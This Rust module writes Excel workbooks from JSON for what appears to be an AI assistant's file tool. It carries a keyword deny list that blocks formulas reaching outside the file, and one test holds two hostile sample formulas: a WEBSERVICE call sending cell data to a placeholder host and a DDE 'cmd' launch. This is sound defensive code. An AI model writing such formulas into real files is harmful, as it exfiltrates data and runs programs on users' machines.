//! A workbook as an Excel file (`.xlsx`), written by hand.
//!
//! SpreadsheetML (ECMA-376) is a zip of a workbook part, one part per sheet
//! and a style sheet. What the assistant needs from it is small and fixed:
//! several sheets, text, numbers, dates and booleans, formulas, number
//! formats, bold cells and column widths. That is this module, the same call
//! the Word writer made (ADR-0089): a page of XML, not a dependency.
//!
//! - **Strings are inline** (`t="inlineStr"`), so there is no shared-string
//!   table to keep in step; every reader opens them.
//! - **Formulas carry no cached value** and the workbook asks to be
//!   recalculated on load, so the figures the reader sees are the
//!   spreadsheet's own, never ones the model guessed.
//! - **Everything the model wrote is data.** Text is escaped and stripped of
//!   the characters XML refuses, and a formula that reaches outside the file
//!   (a web service, a DDE link, a macro call) is written as the text it is.

use std::collections::HashMap;

use serde_json::Value;

use super::{invalid, xml_text};
use crate::domain::types::AppError;

const MAX_SHEETS: usize = 20;
const MAX_ROWS: usize = 10_000;
const MAX_COLUMNS: usize = 200;
/// Excel's own limit for one cell.
const MAX_CELL_CHARS: usize = 32_767;
const MAX_FORMAT_CHARS: usize = 64;

#[derive(Debug, Clone, PartialEq)]
enum CellValue {
    Empty,
    Number(f64),
    Text(String),
    Bool(bool),
    Formula(String),
}

#[derive(Debug, Clone, PartialEq)]
struct Cell {
    value: CellValue,
    format: Option<String>,
    bold: bool,
}

#[derive(Debug, Default)]
struct Column {
    width: Option<f64>,
    format: Option<String>,
}

#[derive(Debug)]
struct Sheet {
    name: String,
    columns: Vec<Column>,
    rows: Vec<Vec<Cell>>,
    header: bool,
    freeze_header: bool,
}

/// The `.xlsx` bytes for a workbook described as JSON, and a one-line account
/// of what it holds for the tool's reply.
///
/// `content` is `{sheets: [{name, columns?: [{width?, format?}], rows: [[cell]],
/// header?, freezeHeader?}]}`, or a single sheet's `{rows}`, or bare rows. A
/// cell is a number, a string (`=` opens a formula, an ISO date becomes a
/// date), a boolean, null, or `{value?, formula?, format?, bold?}`.
pub(super) fn build(title: &str, content: &Value) -> Result<(Vec<u8>, String), AppError> {
    let sheets = parse_sheets(title, content)?;
    let mut styles = Styles::default();
    let mut sheet_parts = Vec::with_capacity(sheets.len());
    for (index, sheet) in sheets.iter().enumerate() {
        sheet_parts.push(sheet_xml(sheet, index == 0, &mut styles));
    }
    let mut parts: Vec<(String, Vec<u8>)> = vec![
        (
            "[Content_Types].xml".into(),
            content_types(sheets.len()).into_bytes(),
        ),
        ("_rels/.rels".into(), ROOT_RELS.as_bytes().to_vec()),
        (
            "docProps/core.xml".into(),
            super::core_xml(title).into_bytes(),
        ),
        ("xl/workbook.xml".into(), workbook_xml(&sheets).into_bytes()),
        (
            "xl/_rels/workbook.xml.rels".into(),
            workbook_rels(sheets.len()).into_bytes(),
        ),
        ("xl/styles.xml".into(), styles.xml().into_bytes()),
    ];
    for (index, xml) in sheet_parts.into_iter().enumerate() {
        parts.push((
            format!("xl/worksheets/sheet{}.xml", index + 1),
            xml.into_bytes(),
        ));
    }
    let rows: usize = sheets.iter().map(|sheet| sheet.rows.len()).sum();
    let summary = format!(
        "{} sheet{}, {rows} row{}",
        sheets.len(),
        if sheets.len() == 1 { "" } else { "s" },
        if rows == 1 { "" } else { "s" }
    );
    Ok((super::package(&parts)?, summary))
}

fn parse_sheets(title: &str, content: &Value) -> Result<Vec<Sheet>, AppError> {
    let raw: Vec<&Value> = match content {
        Value::Object(map) => match map.get("sheets") {
            Some(Value::Array(sheets)) => sheets.iter().collect(),
            _ if map.contains_key("rows") => vec![content],
            _ => Vec::new(),
        },
        Value::Array(_) => vec![content],
        _ => Vec::new(),
    };
    if raw.is_empty() {
        return Err(invalid(
            "A spreadsheet needs content.sheets, each with rows (an array of rows, each an array of cells).",
        ));
    }
    let mut names: Vec<String> = Vec::new();
    let mut sheets = Vec::new();
    for (index, value) in raw.into_iter().take(MAX_SHEETS).enumerate() {
        let rows_value = match value {
            Value::Array(_) => Some(value),
            Value::Object(map) => map.get("rows"),
            _ => None,
        };
        let Some(Value::Array(rows_raw)) = rows_value else {
            return Err(invalid(format!("Sheet {} has no rows array.", index + 1)));
        };
        let field = |key: &str| value.as_object().and_then(|map| map.get(key));
        let columns: Vec<Column> = match field("columns") {
            Some(Value::Array(columns)) => columns
                .iter()
                .take(MAX_COLUMNS)
                .map(|column| Column {
                    width: column
                        .get("width")
                        .and_then(Value::as_f64)
                        .filter(|width| width.is_finite())
                        .map(|width| width.clamp(2.0, 120.0)),
                    format: column
                        .get("format")
                        .and_then(Value::as_str)
                        .and_then(clean_format),
                })
                .collect(),
            _ => Vec::new(),
        };
        let header = field("header").and_then(Value::as_bool).unwrap_or(true);
        let freeze_header = field("freezeHeader")
            .or_else(|| field("freeze_header"))
            .and_then(Value::as_bool)
            .unwrap_or(header);
        let mut rows = Vec::new();
        for (row_index, row) in rows_raw.iter().take(MAX_ROWS).enumerate() {
            let cells: Vec<Cell> = match row {
                Value::Array(cells) => cells.iter().take(MAX_COLUMNS).map(parse_cell).collect(),
                // A row given as one value is a one-cell row.
                other => vec![parse_cell(other)],
            };
            let cells = cells
                .into_iter()
                .enumerate()
                .map(|(column, mut cell)| {
                    if header && row_index == 0 {
                        cell.bold = true;
                    } else if cell.format.is_none() {
                        cell.format = columns.get(column).and_then(|c| c.format.clone());
                    }
                    cell
                })
                .collect();
            rows.push(cells);
        }
        let wanted = field("name")
            .and_then(Value::as_str)
            .map(str::to_string)
            .unwrap_or_else(|| {
                if index == 0 {
                    title.to_string()
                } else {
                    String::new()
                }
            });
        let name = sheet_name(&wanted, index, &names);
        names.push(name.clone());
        sheets.push(Sheet {
            name,
            columns,
            rows,
            header,
            freeze_header,
        });
    }
    Ok(sheets)
}

fn parse_cell(value: &Value) -> Cell {
    let plain = |value: CellValue| Cell {
        value,
        format: None,
        bold: false,
    };
    match value {
        Value::Null => plain(CellValue::Empty),
        Value::Bool(flag) => plain(CellValue::Bool(*flag)),
        Value::Number(number) => plain(
            number
                .as_f64()
                .filter(|n| n.is_finite())
                .map_or(CellValue::Empty, CellValue::Number),
        ),
        Value::String(text) => text_cell(text),
        Value::Object(map) => {
            let mut cell = match (map.get("formula"), map.get("value")) {
                (Some(Value::String(formula)), _) => formula_cell(formula),
                (_, Some(value)) if !value.is_object() => parse_cell(value),
                _ => plain(CellValue::Empty),
            };
            if let Some(format) = map
                .get("format")
                .and_then(Value::as_str)
                .and_then(clean_format)
            {
                cell.format = Some(format);
            }
            cell.bold = map.get("bold").and_then(Value::as_bool).unwrap_or(false);
            cell
        }
        Value::Array(_) => plain(CellValue::Text(capped(&value.to_string()))),
    }
}

fn text_cell(text: &str) -> Cell {
    if text.starts_with('=') && text.len() > 1 {
        return formula_cell(text);
    }
    if let Some(serial) = iso_date_serial(text.trim()) {
        return Cell {
            value: CellValue::Number(serial),
            format: Some(if text.trim().len() > 10 {
                "yyyy-mm-dd hh:mm".to_string()
            } else {
                "yyyy-mm-dd".to_string()
            }),
            bold: false,
        };
    }
    Cell {
        value: CellValue::Text(capped(text)),
        format: None,
        bold: false,
    }
}

/// A formula, unless it reaches outside the workbook: those are written as
/// the text they are, because a file the assistant made must not fetch a URL
/// or start a program when someone opens it.
fn formula_cell(raw: &str) -> Cell {
    let formula = raw.trim().trim_start_matches('=').trim();
    let upper = formula.to_ascii_uppercase();
    let reaches_out = formula.contains('|')
        || [
            "WEBSERVICE",
            "FILTERXML",
            "CALL(",
            "REGISTER",
            "EXEC(",
            "RTD(",
            "DDE",
        ]
        .iter()
        .any(|word| upper.contains(word));
    let value = if formula.is_empty() || reaches_out {
        CellValue::Text(capped(raw))
    } else {
        CellValue::Formula(capped(formula))
    };
    Cell {
        value,
        format: None,
        bold: false,
    }
}

fn capped(text: &str) -> String {
    text.chars().take(MAX_CELL_CHARS).collect()
}

fn clean_format(raw: &str) -> Option<String> {
    let format = raw.trim();
    (!format.is_empty()
        && format.chars().count() <= MAX_FORMAT_CHARS
        && !format.chars().any(char::is_control))
    .then(|| format.to_string())
}

/// `2026-10-08` or `2026-10-08T14:30[:00]` as an Excel serial date (days since
/// 1899-12-30, the epoch every reader agrees on for modern dates).
fn iso_date_serial(text: &str) -> Option<f64> {
    let bytes = text.as_bytes();
    if bytes.len() < 10 || bytes[4] != b'-' || bytes[7] != b'-' {
        return None;
    }
    let epoch = chrono::NaiveDate::from_ymd_opt(1899, 12, 30)?;
    if text.len() == 10 {
        let date = chrono::NaiveDate::parse_from_str(text, "%Y-%m-%d").ok()?;
        return Some((date - epoch).num_days() as f64);
    }
    let datetime = chrono::NaiveDateTime::parse_from_str(text, "%Y-%m-%dT%H:%M:%S")
        .or_else(|_| chrono::NaiveDateTime::parse_from_str(text, "%Y-%m-%dT%H:%M"))
        .or_else(|_| chrono::NaiveDateTime::parse_from_str(text, "%Y-%m-%d %H:%M"))
        .ok()?;
    let seconds = (datetime - epoch.and_hms_opt(0, 0, 0)?).num_seconds() as f64;
    Some(seconds / 86_400.0)
}

/// A sheet name Excel accepts: at most 31 characters, none of `[]:*?/\`, not
/// empty, not quoted, and unique in the workbook (case-insensitively).
fn sheet_name(wanted: &str, index: usize, taken: &[String]) -> String {
    let cleaned: String = wanted
        .chars()
        .filter(|c| !matches!(c, '[' | ']' | ':' | '*' | '?' | '/' | '\\') && !c.is_control())
        .collect();
    let cleaned = cleaned.trim().trim_matches('\'').trim();
    let base: String = if cleaned.is_empty() {
        format!("Sheet{}", index + 1)
    } else {
        cleaned.chars().take(31).collect()
    };
    let clashes = |name: &str| taken.iter().any(|t| t.eq_ignore_ascii_case(name));
    if !clashes(&base) {
        return base;
    }
    (2..)
        .map(|n| {
            let suffix = format!(" ({n})");
            let stem: String = base.chars().take(31 - suffix.chars().count()).collect();
            format!("{stem}{suffix}")
        })
        .find(|name| !clashes(name))
        .unwrap_or(base)
}

/// `0` is `A`, `25` is `Z`, `26` is `AA`.
fn column_letters(mut index: usize) -> String {
    let mut letters = Vec::new();
    loop {
        letters.push(b'A' + (index % 26) as u8);
        if index < 26 {
            break;
        }
        index = index / 26 - 1;
    }
    letters.reverse();
    String::from_utf8(letters).unwrap_or_default()
}

/// The style sheet, grown as cells ask for formats: one `xf` per distinct
/// (number format, bold) pair, index 0 being the default.
#[derive(Default)]
struct Styles {
    custom_formats: Vec<String>,
    xfs: Vec<(u32, bool)>,
    index: HashMap<(u32, bool), usize>,
}

impl Styles {
    fn format_id(&mut self, format: &str) -> u32 {
        let builtin = match format {
            "General" => Some(0),
            "0" => Some(1),
            "0.00" => Some(2),
            "#,##0" => Some(3),
            "#,##0.00" => Some(4),
            "0%" => Some(9),
            "0.00%" => Some(10),
            "0.00E+00" => Some(11),
            "mm-dd-yy" => Some(14),
            "d-mmm-yy" => Some(15),
            "h:mm" => Some(20),
            "@" => Some(49),
            _ => None,
        };
        if let Some(id) = builtin {
            return id;
        }
        let position = match self.custom_formats.iter().position(|f| f == format) {
            Some(position) => position,
            None => {
                self.custom_formats.push(format.to_string());
                self.custom_formats.len() - 1
            }
        };
        164 + position as u32
    }

    /// The `s` attribute for a cell, or none for the default style.
    fn style(&mut self, cell: &Cell) -> Option<usize> {
        let format = cell.format.as_deref().map_or(0, |f| self.format_id(f));
        if format == 0 && !cell.bold {
            return None;
        }
        let key = (format, cell.bold);
        if let Some(index) = self.index.get(&key) {
            return Some(*index);
        }
        self.xfs.push(key);
        let index = self.xfs.len();
        self.index.insert(key, index);
        Some(index)
    }

    fn xml(&self) -> String {
        let mut xml = String::from(
            "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<styleSheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">",
        );
        if !self.custom_formats.is_empty() {
            xml.push_str(&format!(
                "<numFmts count=\"{}\">",
                self.custom_formats.len()
            ));
            for (position, format) in self.custom_formats.iter().enumerate() {
                xml.push_str(&format!(
                    "<numFmt numFmtId=\"{}\" formatCode=\"{}\"/>",
                    164 + position,
                    xml_text(format)
                ));
            }
            xml.push_str("</numFmts>");
        }
        xml.push_str("<fonts count=\"2\"><font><sz val=\"11\"/><name val=\"Calibri\"/><family val=\"2\"/></font><font><b/><sz val=\"11\"/><name val=\"Calibri\"/><family val=\"2\"/></font></fonts><fills count=\"2\"><fill><patternFill patternType=\"none\"/></fill><fill><patternFill patternType=\"gray125\"/></fill></fills><borders count=\"1\"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count=\"1\"><xf numFmtId=\"0\" fontId=\"0\" fillId=\"0\" borderId=\"0\"/></cellStyleXfs>");
        xml.push_str(&format!(
            "<cellXfs count=\"{}\"><xf numFmtId=\"0\" fontId=\"0\" fillId=\"0\" borderId=\"0\" xfId=\"0\"/>",
            self.xfs.len() + 1
        ));
        for (format, bold) in &self.xfs {
            xml.push_str(&format!(
                "<xf numFmtId=\"{format}\" fontId=\"{}\" fillId=\"0\" borderId=\"0\" xfId=\"0\"{}{}/>",
                u8::from(*bold),
                if *format == 0 { "" } else { " applyNumberFormat=\"1\"" },
                if *bold { " applyFont=\"1\"" } else { "" },
            ));
        }
        xml.push_str("</cellXfs><cellStyles count=\"1\"><cellStyle name=\"Normal\" xfId=\"0\" builtinId=\"0\"/></cellStyles></styleSheet>");
        xml
    }
}

const NS: &str = "xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"";

fn sheet_xml(sheet: &Sheet, selected: bool, styles: &mut Styles) -> String {
    let mut xml = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<worksheet {NS}><sheetViews><sheetView{} workbookViewId=\"0\">",
        if selected { " tabSelected=\"1\"" } else { "" }
    );
    if sheet.freeze_header && sheet.header && sheet.rows.len() > 1 {
        xml.push_str(
            "<pane ySplit=\"1\" topLeftCell=\"A2\" activePane=\"bottomLeft\" state=\"frozen\"/>",
        );
    }
    xml.push_str("</sheetView></sheetViews><sheetFormatPr defaultRowHeight=\"15\"/>");
    let width_count = sheet
        .rows
        .iter()
        .map(Vec::len)
        .max()
        .unwrap_or(0)
        .max(sheet.columns.len());
    if width_count > 0 {
        xml.push_str("<cols>");
        for column in 0..width_count {
            let width = sheet
                .columns
                .get(column)
                .and_then(|c| c.width)
                .unwrap_or_else(|| fitted_width(sheet, column));
            xml.push_str(&format!(
                "<col min=\"{n}\" max=\"{n}\" width=\"{width:.2}\" customWidth=\"1\"/>",
                n = column + 1
            ));
        }
        xml.push_str("</cols>");
    }
    xml.push_str("<sheetData>");
    for (row_index, row) in sheet.rows.iter().enumerate() {
        let number = row_index + 1;
        xml.push_str(&format!("<row r=\"{number}\">"));
        for (column, cell) in row.iter().enumerate() {
            let reference = format!("{}{number}", column_letters(column));
            let style = styles
                .style(cell)
                .map(|s| format!(" s=\"{s}\""))
                .unwrap_or_default();
            match &cell.value {
                CellValue::Empty if style.is_empty() => {}
                CellValue::Empty => xml.push_str(&format!("<c r=\"{reference}\"{style}/>")),
                CellValue::Number(n) => {
                    xml.push_str(&format!("<c r=\"{reference}\"{style}><v>{n}</v></c>"))
                }
                CellValue::Bool(flag) => xml.push_str(&format!(
                    "<c r=\"{reference}\"{style} t=\"b\"><v>{}</v></c>",
                    u8::from(*flag)
                )),
                CellValue::Text(text) => xml.push_str(&format!(
                    "<c r=\"{reference}\"{style} t=\"inlineStr\"><is><t xml:space=\"preserve\">{}</t></is></c>",
                    xml_text(text)
                )),
                CellValue::Formula(formula) => xml.push_str(&format!(
                    "<c r=\"{reference}\"{style}><f>{}</f></c>",
                    xml_text(formula)
                )),
            }
        }
        xml.push_str("</row>");
    }
    xml.push_str("</sheetData></worksheet>");
    xml
}

/// A width that shows the column's longest value, within reason.
fn fitted_width(sheet: &Sheet, column: usize) -> f64 {
    let longest = sheet
        .rows
        .iter()
        .filter_map(|row| row.get(column))
        .map(|cell| match &cell.value {
            CellValue::Text(text) => text.lines().map(|l| l.chars().count()).max().unwrap_or(0),
            CellValue::Number(n) => n.to_string().len().max(10),
            CellValue::Formula(_) => 12,
            CellValue::Bool(_) => 5,
            CellValue::Empty => 0,
        })
        .max()
        .unwrap_or(0);
    (longest as f64 + 2.0).clamp(8.0, 60.0)
}

fn workbook_xml(sheets: &[Sheet]) -> String {
    let mut xml = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<workbook {NS}><bookViews><workbookView/></bookViews><sheets>"
    );
    for (index, sheet) in sheets.iter().enumerate() {
        xml.push_str(&format!(
            "<sheet name=\"{}\" sheetId=\"{n}\" r:id=\"rId{n}\"/>",
            xml_text(&sheet.name),
            n = index + 1
        ));
    }
    xml.push_str("</sheets><calcPr calcId=\"191029\" fullCalcOnLoad=\"1\"/></workbook>");
    xml
}

fn workbook_rels(sheets: usize) -> String {
    let mut xml = String::from(
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">",
    );
    for n in 1..=sheets {
        xml.push_str(&format!(
            "<Relationship Id=\"rId{n}\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet{n}.xml\"/>"
        ));
    }
    xml.push_str(&format!(
        "<Relationship Id=\"rId{}\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/></Relationships>",
        sheets + 1
    ));
    xml
}

fn content_types(sheets: usize) -> String {
    let mut xml = String::from(
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/><Override PartName=\"/xl/styles.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml\"/><Override PartName=\"/docProps/core.xml\" ContentType=\"application/vnd.openxmlformats-package.core-properties+xml\"/>",
    );
    for n in 1..=sheets {
        xml.push_str(&format!(
            "<Override PartName=\"/xl/worksheets/sheet{n}.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>"
        ));
    }
    xml.push_str("</Types>");
    xml
}

const ROOT_RELS: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/></Relationships>"#;

#[cfg(test)]
mod tests {
    use super::super::tests_support::{assert_valid_package, part};
    use super::*;
    use serde_json::json;

    fn budget() -> Value {
        json!({
            "sheets": [
                {
                    "name": "Budget",
                    "columns": [{"width": 24}, {"format": "#,##0.00"}, {"format": "0.0%"}],
                    "rows": [
                        ["Item", "Cost", "Share"],
                        ["Rent & bills", 1200, "=B2/B5"],
                        ["Food <weekly>", 450.5, "=B3/B5"],
                        ["Travel", 300, {"formula": "B4/B5", "format": "0.00%"}],
                        [{"value": "Total", "bold": true}, "=SUM(B2:B4)", null],
                        ["Started", "2026-10-08", true]
                    ]
                },
                {"name": "Budget", "rows": [["Again"], [1], [2]]},
                {"name": "Bad [name]: *?/\\", "header": false, "rows": [[1, 2]]}
            ]
        })
    }

    #[test]
    fn a_workbook_keeps_its_sheets_formulas_formats_and_widths() {
        let (bytes, summary) = build("Household", &budget()).unwrap();
        assert_eq!(summary, "3 sheets, 10 rows");
        assert_valid_package(&bytes);
        let workbook = part(&bytes, "xl/workbook.xml");
        assert!(workbook.contains("<sheet name=\"Budget\" sheetId=\"1\" r:id=\"rId1\"/>"));
        // Names are unique and stripped of what Excel refuses.
        assert!(workbook.contains("<sheet name=\"Budget (2)\" sheetId=\"2\""));
        assert!(workbook.contains("<sheet name=\"Bad name\" sheetId=\"3\""));
        assert!(workbook.contains("fullCalcOnLoad=\"1\""));
        let sheet = part(&bytes, "xl/worksheets/sheet1.xml");
        // Header row bold, text escaped, numbers raw, formulas without `=`.
        assert!(sheet.contains(
            "<c r=\"A1\" s=\"1\" t=\"inlineStr\"><is><t xml:space=\"preserve\">Item</t>"
        ));
        assert!(sheet.contains("Rent &amp; bills"));
        assert!(sheet.contains("Food &lt;weekly&gt;"));
        assert!(sheet.contains("<v>450.5</v>"));
        assert!(sheet.contains("<f>B2/B5</f>"));
        assert!(sheet.contains("<f>SUM(B2:B4)</f>"));
        assert!(sheet.contains("<f>B4/B5</f>"));
        assert!(sheet.contains("t=\"b\"><v>1</v>"));
        // 2026-10-08 is serial 46303.
        assert!(sheet.contains("<v>46303</v>"));
        assert!(sheet.contains("<col min=\"1\" max=\"1\" width=\"24.00\" customWidth=\"1\"/>"));
        assert!(sheet.contains("state=\"frozen\""));
        assert!(sheet.contains("tabSelected=\"1\""));
        assert!(!part(&bytes, "xl/worksheets/sheet2.xml").contains("tabSelected"));
        assert!(!part(&bytes, "xl/worksheets/sheet3.xml").contains("frozen"));
        let styles = part(&bytes, "xl/styles.xml");
        // Built-in formats by id, custom ones declared from 164.
        assert!(styles.contains("numFmtId=\"4\""));
        assert!(styles.contains("numFmtId=\"10\""));
        assert!(styles.contains("<numFmt numFmtId=\"164\" formatCode=\"0.0%\"/>"));
        assert!(styles.contains("formatCode=\"yyyy-mm-dd\""));
        let types = part(&bytes, "[Content_Types].xml");
        assert_eq!(types.matches("worksheet+xml").count(), 3);
    }

    #[test]
    fn formulas_that_reach_outside_the_file_stay_text() {
        let (bytes, _) = build(
            "x",
            &json!({"rows": [["=WEBSERVICE(\"https://e.example/?\"&A1)", "=cmd|' /C calc'!A0", "=1+1"]]}),
        )
        .unwrap();
        let sheet = part(&bytes, "xl/worksheets/sheet1.xml");
        assert_eq!(sheet.matches("<f>").count(), 1);
        assert!(sheet.contains("<f>1+1</f>"));
        assert!(sheet.contains("=WEBSERVICE("));
    }

    #[test]
    fn bare_rows_make_one_sheet_named_after_the_title() {
        let (bytes, _) = build("Q3: numbers", &json!([["a", 1], ["b", 2]])).unwrap();
        assert!(part(&bytes, "xl/workbook.xml").contains("<sheet name=\"Q3 numbers\""));
        assert!(build("x", &json!({"text": "nothing"})).is_err());
    }

    #[test]
    fn column_letters_roll_over() {
        assert_eq!(column_letters(0), "A");
        assert_eq!(column_letters(25), "Z");
        assert_eq!(column_letters(26), "AA");
        assert_eq!(column_letters(701), "ZZ");
        assert_eq!(column_letters(702), "AAA");
    }
}
